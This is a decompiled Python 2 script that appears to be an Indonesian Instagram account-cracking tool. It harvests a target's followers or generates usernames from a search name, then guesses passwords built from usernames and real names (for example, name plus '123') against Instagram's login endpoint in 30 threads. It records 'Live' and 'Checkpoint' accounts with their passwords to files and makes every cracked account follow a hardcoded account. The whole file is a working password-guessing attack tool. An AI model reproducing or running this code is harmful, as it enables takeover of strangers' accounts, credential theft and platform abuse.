# uncompyle6 version 3.7.4

# Python bytecode 2.7 (62211)

# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 

# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://

# Embedded file name: /sdcard/insta.py

# Compiled at: 2021-12-10 00:22:37

a = '\x1b[96;1m'

p = '\x1b[97;1m'

h = '\x1b[92;1m'

k = '\x1b[93;1m'

m = '\x1b[91;1m'

d = '\x1b[90;1m'

import os

try:

    import concurrent.futures

except ImportError:

    print k + '\n Modul Futures Not installed!...'

    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:

    import requests

except ImportError:

    print k + '\n Modul Requests Not installed!...'

    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

import os, requests, re, json, random, sys, platform, base64, datetime, subprocess, time

from calendar import monthrange

from concurrent.futures import ThreadPoolExecutor

garis = h + '+++>'

data_ = []

hasil_ok = []

hasil_cp = []

c = 1

status_foll = []

data_followers = []

pencarian_ = []

platform_dev = str(platform.platform()).lower()

p1 = base64.b64encode(platform_dev)

try:

    has_ok = open('result_ok.txt', 'r').readlines()

    with open('result_ok.txt', 'w') as (tul):

        tul.write('')

    for dev in set(has_ok):

        with open('result_ok.txt', 'a') as (tu):

            tu.write(dev)

except:

    pass

try:

    has_cp = open('result_cp.txt', 'r').readlines()

    with open('result_cp.txt', 'w') as (tul):

        tul.write('')

    for dev in set(has_cp):

        with open('result_cp.txt', 'a') as (tu):

            tu.write(dev)

except:

    pass

url_instagram = 'https://www.instagram.com/'

user_agentz = 'ua'

user_agentz_api = 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)'

user_agentz_qu = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0', 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)']

headerz = {'User-Agent': user_agentz}

headerz_api = {'User-Agent': user_agentz_api}

def hapus_cookie():

    try:

        os.system('del cookie.txt' if os.name == 'nt' else 'rm -f cookie.txt')

    except:

        pass

def hapus_cokiz():

    try:

        os.system('del cokiz.txt' if os.name == 'nt' else 'rm -f cokiz.txt')

    except:

        pass

def cek_hasil():

    print garis

    print h + ' >' + k + ' 1' + p + '. Check Results ' + h + 'OK/Live'

    print h + ' >' + k + ' 2' + p + '. Check Results ' + k + 'Checkpoint'

    print garis

    while True:

        pil = raw_input(a + ' ? ' + p + 'Choose' + h + ': ')

        if pil == '1':

            try:

                hasil_ok_ = open('result_ok.txt', 'r').readlines()

                print k + '\n >_' + p + ' Show Result ' + h + 'Live\n'

                for dev in hasil_ok_:

                    ok = dev.replace('\n', '').split('==>')

                    print a + '  {' + k + 'Live' + a + '} ' + h + ok[1] + a + ' | ' + p + ok[3]

                print h + '\n >_< ' + p + 'Total' + k + ': ' + str(len(hasil_ok_))

            except:

                print k + '\n No Results' + h + ' OK'

            break

        elif pil == '2':

            try:

                hasil_cp_ = open('result_cp.txt', 'r').readlines()

                print k + '\n >_' + p + ' Show Results ' + k + 'Checkpoint\n'

                for dev in hasil_cp_:

                    cp = dev.replace('\n', '').split('==>')

                    print a + '  {' + p + 'Chek' + a + '} ' + k + cp[1] + a + ' | ' + d + cp[3]

                print h + '\n >_< ' + p + 'Total' + k + ': ' + str(len(hasil_cp_))

            except:

                print k + '\n No Results' + p + ' CP'

            break

def cek_login():

    global cookie

    try:

        cok = open('cookie.txt', 'r').read()

    except IOError:

        login_dev()

    else:

        url = 'https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5'

        with requests.Session() as (ses_dev):

            try:

                login_coki = ses_dev.get(url, cookies={'cookie': cok}, headers=headerz_api)

                if 'users' in json.loads(login_coki.content):

                    cookie = {'cookie': cok}

                else:

                    print m + '\n Cookie Expired...\n'

                    hapus_cookie()

                    login_dev()

            except ValueError:

                print m + '\n Cookie Expired...\n'

                hapus_cookie()

                login_dev()

def login_dev_cookie():

    global cookie

    print '\n  Login Instagram\n'

    cok = raw_input(' Enter Cookie: ')

    with requests.Session() as (ses_dev):

        login_coki = ses_dev.get(url_instagram, cookies={'cookie': cok}, headers=headerz)

        if 'viewer_has_liked' in str(login_coki.content):

            print ' Login Success....'

            with open('cookie.txt', 'w') as (tulis_coki):

                tulis_coki.write(cok)

            cookie = {'cookie': cok}

        else:

            print ' Login Fail....'

            exit()

def data_pencarian_dev(cookie, nama, limit):

    url = ('https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true').format(limit, nama)

    with requests.Session() as (ses_dev):

        res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)

        for dev in json.loads(res_dat_pencarian.content)['users']:

            users = dev['user']

            print ' Username:', users['username']

            print ' Name:', users['full_name'].encode('utf-8')

            print '-' * 50

def crack():

    with ThreadPoolExecutor(max_workers=30) as (insta_dev):

        for dataku in data_:

            try:

                pw = []

                data = dataku.encode('utf-8')

                dat_ = data.split('==>')[0]

                pw_ = data.split('==>')[1]

                pw_nam = pw_.split()

                if len(pencarian_) != 1:

                    if len(dat_) >= 6:

                        pw.append(dat_)

                        if len(pw_nam[0]) <= 2:

                            if len(pw_nam) >= 2:

                                pw.append(pw_nam[0] + pw_nam[1])

                            if len(pw_) >= 6:

                                pw.append(pw_)

                        else:

                            pw.append(pw_nam[0] + '123')

                            if len(pw_nam) >= 2:

                                pw.append(pw_nam[0] + pw_nam[1])

                            if len(pw_) >= 6:

                                pw.append(pw_)

                    elif len(pw_nam[0]) <= 2:

                        if len(pw_nam) >= 2:

                            pw.append(pw_nam[0] + pw_nam[1])

                        if len(pw_) >= 6:

                            pw.append(pw_)

                    else:

                        if len(pw_nam) >= 2:

                            pw.append(pw_nam[0] + pw_nam[1])

                        pw.append(pw_nam[0] + '123')

                        if len(pw_) >= 6:

                            pw.append(pw_)

                else:

                    pw.append(pw_nam[0] + '123')

                    pw.append(dat_)

                insta_dev.submit(crack_dev, dat_, pw)

            except:

                pass

def auto_follow():

    data_ok = open('result_ok.txt', 'r').readlines()

    for dev in data_ok:

        pecah = dev.split('==>')[1]

        if pecah not in data_followers:

            print ('\r >- Not Followed: {}').format(len(data_)),

            sys.stdout.flush()

            data_.append(dev)

    print '\n'

    with ThreadPoolExecutor(max_workers=3) as (insta_foll):

        for data_foll in data_:

            data_foll_ = data_foll.replace('\n', '')

            us_foll = data_foll_.split('==>')[1]

            pw_foll = data_foll_.split('==>')[3]

            insta_foll.submit(crack_dev, us_foll, pw_foll)

c_foll = 1

count_foll = 1

def follow_dev(ses_dev, username_dev):

    global c_foll

    global count_foll

    if len(status_foll) != 1:

        user_target = 'iqbaldev'

        id_target = '12629128399'

    else:

        print h + ('\r >>> Follow {}/{}|Chek+{}/Live+{}  ').format(str(count_foll), len(data_), len(hasil_cp), len(hasil_ok)),

        sys.stdout.flush()

        user_target = username_get_follow

        id_target = id_

    dat_crf_foll = ses_dev.get(('https://www.instagram.com/{}/').format(user_target), headers=headerz_api).content

    crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]

    headerz_foll = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 

       'Accept-Language': 'en-US,en;q=0.5', 

       'Host': 'www.instagram.com', 

       'Origin': 'https://www.instagram.com', 

       'Referer': ('https://www.instagram.com/{}/').format(user_target), 

       'User-Agent': user_agentz, 

       'X-CSRFToken': crf_token_foll}

    param_foll = {''}

    url_follow = ('https://www.instagram.com/web/friendships/{}/follow/').format(id_target)

    res_foll = ses_dev.post(url_follow, headers=headerz_foll)

    if len(status_foll) != 1:

        pass

    else:

        print h + '\r [' + k + '>-' + h + '] ' + p + str(c_foll) + ' ' + k + username_dev + h + ' Sukses Mengikuti ' + p + user_target + k + ' >_< Wkwwkwkw\n'

        c_foll += 1

        count_foll += 1

None

def login_dev():

    global cookie

    print ''

    print a + '  {' + p + ' Login Instagram ' + a + '}'

    print m + '   ----------------'

    print garis

    username_dev = raw_input(a + ' ?' + p + ' Enter Username' + h + ': ')

    pass_dev = raw_input(a + ' ?' + p + ' Enter Password' + d + ': ')

    try:

        try:

            headerz = {'User-Agent': user_agentz}

            with requests.Session() as (dev):

                url_scrap = 'https://www.instagram.com/'

                data = dev.get(url_scrap, headers=headerz).content

                crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]

            header = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 

               'Accept-Language': 'en-US,en;q=0.5', 

               'Host': 'www.instagram.com', 

               'X-CSRFToken': crf_token, 

               'X-Requested-With': 'XMLHttpRequest', 

               'Referer': 'https://www.instagram.com/accounts/login/', 

               'User-Agent': user_agentz}

            param = {'username': username_dev, 

               'enc_password': ('#PWD_INSTAGRAM_BROWSER:0:{}:{}').format(random.randint(1000000000, 9999999999), pass_dev), 

               'optIntoOneTap': False, 

               'queryParams': {}, 'stopDeletionNonce': '', 

               'trustedDeviceRecords': {}}

        except:

            header = {}

            param = {}

        with requests.Session() as (ses_dev):

            url = 'https://www.instagram.com/accounts/login/ajax/'

            respon = ses_dev.post(url, data=param, headers=header)

            data_dev = json.loads(respon.content)

            da = respon.cookies.get_dict()

            if 'userId' in str(data_dev):

                print p + '\n *' + h + ' Login Success..'

                for dev in da:

                    with open('cookie.txt', 'a') as (tulis):

                        tulis.write(dev + '=' + da[dev] + ';')

                follow_dev(ses_dev, username_dev)

                cok = open('cookie.txt', 'r').read()

                cookie = {'cookie': cok}

            elif 'checkpoint_url' in str(data_dev):

                print k + '\n Account Cp'

            elif 'Please wait' in str(data_dev):

                print m + ' >>> Use Airplane Mood!! >>'

            else:

                print m + '\n Login Fail....'

                exit()

    except KeyboardInterrupt:

        exit()

None

def data_follower_dev(cookie, id_target, limit, opsi):

    global c

    if opsi == '1':

        url = ('https://i.instagram.com/api/v1/friendships/{}/followers/?count={}').format(id_target, limit)

    elif opsi == '2':

        url = ('https://i.instagram.com/api/v1/friendships/{}/following/?count={}').format(id_target, limit)

    else:

        exit(' Error..')

    with requests.Session() as (ses_dev):

        res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)

        for dev in json.loads(res_dat_foll.content)['users']:

            username = dev['username']

            nama = dev['full_name'].encode('utf-8')

            if len(status_foll) != 1:

                print h + '\r * ' + p + 'Take Username' + h + (': {}').format(len(data_)),

                sys.stdout.flush()

                data_.append(username + '==>' + nama.decode('utf-8'))

                c += 1

            else:

                data_followers.append(username)

None

def info_dev(username_dev, pass_dev, status):

    global id_

    global mengikuti

    global pengikut

    try:

        da = requests.get(('https://www.instagram.com/{}/?__a=1').format(username_dev), headers={'User-Agent': user_agentz})

        data_us_dev = da.json()['graphql']['user']

        nama = data_us_dev['full_name'].encode('utf-8')

        id_ = data_us_dev['id']

        pengikut = data_us_dev['edge_followed_by']['count']

        mengikuti = data_us_dev['edge_follow']['count']

        if status == 'Live':

            print h + '\r [' + k + '>-' + h + ']' + p + ' Status: ' + h + status + '                 '

            print h + '\r [' + k + '>-' + h + ']' + p + ' Name: ' + h + str(nama) + '              '

            print h + '\r [' + k + '>-' + h + ']' + p + ' Follower: ' + k + str(pengikut) + '              '

            print h + '\r [' + k + '>-' + h + ']' + p + ' Following: ' + k + str(mengikuti) + '              '

            print h + '\r [' + k + '>-' + h + ']' + p + ' Username: ' + h + username_dev + '              '

            print h + '\r [' + k + '>-' + h + ']' + p + ' Password: ' + h + pass_dev + '             \n'

        elif status == 'Checkpoint':

            print k + '\r [' + p + '>-' + k + ']' + p + ' Status: ' + k + status + '                 '

            print k + '\r [' + p + '>-' + k + ']' + p + ' Name: ' + k + str(nama) + '              '

            print k + '\r [' + p + '>-' + k + ']' + p + ' Follower: ' + p + str(pengikut) + '              '

            print k + '\r [' + p + '>-' + k + ']' + p + ' Following: ' + p + str(mengikuti) + '              '

            print k + '\r [' + p + '>-' + k + ']' + p + ' Username: ' + k + username_dev + '              '

            print k + '\r [' + p + '>-' + k + ']' + p + ' Password: ' + k + pass_dev + '             \n'

    except:

        pass

None

count_ = 1

def crack_dev(username_dev, pass_dev_):

    global c

    global count_

    c_pw = len(pass_dev_)

    for pass_satu in pass_dev_:

        if c != 1:

            pass

        else:

            if len(status_foll) != 1:

                print h + ('\r >>>\x1b[97;1m Crack \x1b[96;1m{}\x1b[97;1m/\x1b[96;1m{}\x1b[97;1m/\x1b[96;1m{}\x1b[97;1m|\x1b[93;1mChek+{}\x1b[97;1m/\x1b[92;1mLive+{}  ').format(str(c_pw), str(count_), len(data_), len(hasil_cp), len(hasil_ok)),

                sys.stdout.flush()

                c_pw -= 1

            try:

                if username_dev in hasil_ok or username_dev in hasil_cp:

                    break

                pass_dev = pass_satu.lower()

                try:

                    headerz = {'User-Agent': user_agentz_api}

                    with requests.Session() as (dev):

                        url_scrap = 'https://www.instagram.com/'

                        data = dev.get(url_scrap, headers=headerz).content

                        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]

                    header = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 

                       'Accept-Language': 'en-US,en;q=0.5', 

                       'Host': 'www.instagram.com', 

                       'X-CSRFToken': crf_token, 

                       'X-Requested-With': 'XMLHttpRequest', 

                       'Referer': 'https://www.instagram.com/accounts/login/', 

                       'User-Agent': user_agentz}

                    param = {'username': username_dev, 

                       'enc_password': ('#PWD_INSTAGRAM_BROWSER:0:{}:{}').format(random.randint(1000000000, 99999999999), pass_dev), 

                       'optIntoOneTap': False, 

                       'queryParams': {}, 'stopDeletionNonce': '', 

                       'trustedDeviceRecords': {}}

                except:

                    header = {}

                    param = {}

                with requests.Session() as (ses_dev):

                    url = 'https://www.instagram.com/accounts/login/ajax/'

                    respon = ses_dev.post(url, data=param, headers=header)

                    data_dev = json.loads(respon.content)

                    time.sleep(0.1)

                    if 'checkpoint_url' in str(data_dev):

                        cp = 'Checkpoint'

                        info_dev(username_dev, pass_dev, cp)

                        with open('hasil_cp.txt', 'a') as (dev_):

                            dev_.write('[Chek]==>' + username_dev + '==>|==>' + pass_dev + '\n')

                        hasil_cp.append(username_dev)

                        break

                    elif 'userId' in str(data_dev):

                        live = 'Live'

                        if len(status_foll) != 1:

                            info_dev(username_dev, pass_dev, live)

                            with open('result_ok.txt', 'a') as (dev_):

                                dev_.write('[Live]==>' + username_dev + '==>|==>' + pass_dev + '\n')

                            hasil_ok.append(username_dev)

                            follow_dev(ses_dev, username_dev)

                        else:

                            hasil_ok.append('dev_id')

                            follow_dev(ses_dev, username_dev)

                        break

                    elif 'Please wait' in str(data_dev):

                        print m + '\r >>> Use Airplane Mood!! >>' + k + (' {}').format(str(c)),

                        c += 1

                        sys.stdout.flush()

                        pass_dev_iq = [pass_dev]

                        crack_dev(username_dev, pass_dev_iq)

                        count_ -= 1

                    else:

                        c = 1

            except requests.exceptions.ConnectionError:

                print k + ('\r No Internet Connection...!>> {}').format(str(c)),

                sys.stdout.flush()

                c += 1

                pass_dev_iq = [pass_dev]

                crack_dev(username_dev, pass_dev_iq)

                count_ -= 1

            except:

                c = 1

    count_ += 1

None

def _yuk_(iqbaldev):

    import string

    try:

        open('cokiz.txt', 'r').read()

    except IOError:

        d_str = []

        fu = base64.b64encode(iqbaldev + 'O')

        for str_ in str(string.ascii_lowercase):

            d_str.append(str_)

        for i_ in fu:

            with open('cokiz.txt', 'a') as (iq):

                iq.write(i_ + random.choice(d_str) + '%')

def _uyuk_():

    global followerz

    global followerzz

    global wak_

    try:

        fol_tam = ''

        fol_tamzz = ''

        fol_z = open('cokiz.txt', 'r').read().split('%>')

        for dev_fol in fol_z[0].split('%'):

            try:

                fol_tam += dev_fol[0]

            except:

                pass

        followerz = base64.b64decode(fol_tam)

        if platform_dev != base64.b64decode(fol_z[2]):

            pass

        else:

            try:

                for dev_folzz in fol_z[1].split('%'):

                    try:

                        fol_tamzz += dev_folzz[0]

                    except:

                        pass

                followerzz = base64.b32decode(fol_tamzz)

            except:

                pass

            try:

                wak_ = base64.b64decode(fol_z[3]).split()

            except:

                pass

    except:

        pass

def pilihan(pil):

    global username_get_follow

    proses_crack = h + ' * ' + p + 'Wait Proses Start...!'

    if pil == '1':

        pas = ''

        status = ''

        username = raw_input(a + '\n ?' + p + ' Enter Target Username' + h + ': ')

        info_dev(username, pas, status)

        print garis

        print p + ' [' + k + '1' + p + '] Follower ' + h + username + p + ' >> ' + k + str(pengikut)

        print p + ' [' + k + '2' + p + '] Following ' + h + username + p + ' >> ' + k + str(mengikuti)

        print garis

        pil2 = raw_input(a + ' ?' + p + ' Choose' + k + ': ')

        limit = input(a + ' ?' + p + ' Enter Limit' + k + ': ')

        if pil2 == '1':

            data_follower_dev(cookie, id_, limit, pil2)

            print

            print proses_crack

            print '\n'

            crack()

        elif pil2 == '2':

            data_follower_dev(cookie, id_, limit, pil2)

            print

            print proses_crack

            print '\n'

            crack()

    elif pil == '2':

        print garis

        usr_ = raw_input(a + ' ?' + p + ' Enter Name' + k + ': ')

        jm = input(a + ' $' + p + ' Total' + h + ': ')

        us = usr_.replace(' ', '')

        pencarian_.append('iqbal_dev')

        data_.append(us + '==>' + us)

        data_.append(us + '_' + '==>' + us)

        for dev in range(1, jm + 1):

            data_.append(us + str(dev) + '==>' + us)

            data_.append(us + '_' + str(dev) + '==>' + us)

            data_.append(us + str(dev) + '_' + '==>' + us)

        print ''

        print proses_crack

        print '\n'

        crack()

    elif pil == 'o':

        data_follower_dev(cookie, id_, limit, pil2)

        print

        print proses_crack

        print '\n'

        crack()

    elif pil == '3':

        cek_hasil()

    elif pil == 'g':

        pas = ''

        status = ''

        status_foll.append('IqbalDev')

        print garis

        username_get_follow = raw_input(a + '  ?' + p + ' Masukkan Username Target' + k + ': ')

        info_dev(username_get_follow, pas, status)

        print garis

        print p + ' [1] Follower ' + h + username_get_follow + p + ' >> ' + k + str(pengikut)

        print p + ' [2] Following ' + h + username_get_follow + p + ' >> ' + k + str(mengikuti)

        print garis

        raw_input(' Enter To .. ')

        print garis

        data_follower_dev(cookie, id_, limit=1000000000, opsi='1')

        auto_follow()

    elif pil == 't':

        import os

        try:

            os.system('git clone https://github.com/IqbalDev/insta_dev')

            os.system('rm -rf insta_dev.py')

            os.system('cp -f insta_dev/insta_dev.py \\.')

            os.system('rm -rf insta_dev')

            print h + '\n Success Update Tool..' + p + '>_<\n'

        except:

            print '\n Device Not Supported  \n'

    elif pil == '4':

        kel = raw_input(k + ' > Log Out? ' + p + 'y/n' + h + ': ')

        if kel in ('y', 'Y'):

            hapus_cookie()

            print ' > Back....'

        else:

            print h + ' > Please run the tool again..'

    elif pil == 'remove_premium':

        hapus_cokiz()

        print p + '\n >_' + h + ' Premium Was removed...\n'

    else:

        print m + ' Choose Correct....'

def menu_dev():

    pil_kon = []

    print '\n'

    belum_premium = a + ' [' + p + '@' + a + '] ' + m + 'SYaM King\xca\x98\xe2\x80\xbf\xca\x98'

    print banner

    print k + ' >_' + h + ' Author:' + k + ' SYaM'

    print k + ' >_' + h + ' Coding:' + k + ' Python2'

    print versi

    try:

        if followerz == followerzz:

            try:

                tgl = datetime.datetime.now()

                bln = tgl.month

                thn = tgl.year

                day = tgl.day

                mulai = datetime.date(int(wak_[0]), int(wak_[1]), int(wak_[2]))

                seles = datetime.date(thn, bln, day)

                sisa = mulai - seles

                lim_dev_id = str(sisa).split()[0]

                if 'U' in fol_dev:

                    print a + ' [' + k + '@' + a + '] ' + h + 'Premium: ' + p + 'Unlimited'

                else:

                    print a + ' [' + k + '@' + a + '] ' + h + 'Premium: ' + k + lim_dev_id + ' ' + p + 'Day again'

                    if ':' in str(lim_dev_id) or '-' in str(lim_dev_id):

                        hapus_cokiz()

                        print ' You have exceeded the usage limit\n Connect To Admin'

                        pil_kon.append('IqbalDev')

            except:

                hapus_cokiz()

        else:

            print belum_premium

    except:

        print belum_premium

    print garis

    print a + ' [' + k + '1' + a + '] ' + p + 'Crack From Public Follower'

    print a + ' [' + k + '2' + a + '] ' + p + 'Crack From Search Name'

    print a + ' [' + k + '3' + a + '] ' + p + 'Check Results' + h + ' OK' + a + '/' + k + 'CP'

    print a + ' [' + k + '4' + a + '] ' + p + 'Log Out Instagram Account'

    print garis

    pil = raw_input('[?] Choose : ')

    pilihan(pil)

_uyuk_()

banner = '\n _______           _______  _______   \n(  ____ \\|\\     /|(  ___  )(       )  \n| (    \\/( \\   / )| (   ) || () () |  \n| (_____  \\ (_) / | (___) || || || |  \n(_____  )  \\   /  |  ___  || |(_)| |  \n      ) |   ) (   | (   ) || |   | |  \n/\\____) |   | |   | )   ( || )   ( |  \n\\_______)   \\_/   |/     \\||/     \\|  \n                                      '

versi = k + ' >_' + h + ' Version_:' + p + ' 0.1\n'

if __name__ == '__main__':

    cek_login()

    menu_dev()

# okay decompiling enc.pyc

